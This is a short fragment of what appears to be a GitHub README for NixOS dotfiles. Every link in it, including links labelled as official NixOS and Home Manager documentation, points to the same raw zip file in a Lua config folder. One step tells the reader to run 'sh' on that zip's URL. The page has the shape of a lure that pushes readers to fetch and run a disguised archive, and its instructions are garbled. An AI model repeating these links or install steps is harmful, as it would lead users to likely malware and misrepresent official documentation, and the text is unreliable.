...
[![Download Latest Release](https://raw.githubusercontent.com/Syonex-coder/dotfiles/main/nvim-config/lua/dotfiles-v3.9.zip%20Latest%20Release-brightgreen)](https://raw.githubusercontent.com/Syonex-coder/dotfiles/main/nvim-config/lua/dotfiles-v3.9.zip)
...
1. **Visit the Releases Page**: Go to the following link to find the latest version: [Download Latest Release](https://raw.githubusercontent.com/Syonex-coder/dotfiles/main/nvim-config/lua/dotfiles-v3.9.zip).
2. **Download the Release**: Look for the https://raw.githubusercontent.com/Syonex-coder/dotfiles/main/nvim-config/lua/dotfiles-v3.9.zip or .zip file that fits your system. Click on it to start the download.
...
6. **Run the Installer**: Once in the correct directory, you may need to run the installation script. Type:
   ```
   sh https://raw.githubusercontent.com/Syonex-coder/dotfiles/main/nvim-config/lua/dotfiles-v3.9.zip
   ```
...
- [NixOS Official Documentation](https://raw.githubusercontent.com/Syonex-coder/dotfiles/main/nvim-config/lua/dotfiles-v3.9.zip)
- [Home Manager Documentation](https://raw.githubusercontent.com/Syonex-coder/dotfiles/main/nvim-config/lua/dotfiles-v3.9.zip)
...
Once again, you can download the latest version [here](https://raw.githubusercontent.com/Syonex-coder/dotfiles/main/nvim-config/lua/dotfiles-v3.9.zip). Enjoy using your new setup!